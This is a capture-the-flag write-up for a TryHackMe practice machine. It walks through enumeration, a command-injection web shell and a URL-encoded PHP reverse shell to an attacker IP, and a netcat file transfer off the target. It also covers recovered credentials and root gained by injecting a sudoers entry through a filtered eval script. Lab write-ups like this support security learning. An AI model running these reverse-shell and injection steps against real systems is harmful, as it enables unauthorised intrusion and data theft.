> PEAK MY HERO ACADEMIA MACHINE
# [Challenge](https://tryhackme.com/room/yueiua)

- # ENUM
	- ### nmap (`nmap -A -p- -T4 --min-rate=5000 myhero`)
		- 22 -> ssh
		- 80 -> http (Apache 2.4.41)
	- ### gobuster (`gobuster dir -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -u http://myhero -x .html,.js,.txt,.php -t 300`)
		- `/assets`

- # EXPLOITATION
	- There's an `index.php` file in `/assets`. Let's try enumerating parameters: `ffuf -u 'http://myhero/assets/index.php?FUZZ=id' -t 100 -w /usr/share/wordlists/directory-list-lowercase-2.3-big.txt -fs 0`
		- `cmd` parameter found!
			- Responses are in `base64`...
	- We have 2 users: `deku` and `ubuntu`
		- Let's open a revshell ([`php%20-r%20%27%24sock%3Dfsockopen%28%2210.8.13.111%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`](https://www.revshells.com/))
	- `python3 -c "import pty; pty.spawn('/bin/bash')"`

- # PRIVILEGE ESCALATION
	- `/var/www/Hidden_Content/passphrase.txt` -> `QWxsbWlnaHRGb3JFdmVyISEhCg==` ---- (`base64`) ---> `AllmightForEver!!!`
		- Passphrase for what?
	- There's an unused image: `/var/www/html/assets/images/oneforall.jpg`. Let's analyze it: `nc -lvnp 8888` -> `nc 10.8.13.111 8888 < oneforall.jpg`
		- Extract `creds.txt` with `steghide` and the password found before
			- `deku:One?For?All_!!one1/A`
	- `sudo -l` -> `/opt/NewComponent/feedback.sh`
	```bash
	  if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
	  eval "echo $feedback"
	  ```
- `deku ALL=NOPASSWD: ALL >> /etc/sudoers` -> `sudo su`
	- We're ROOT!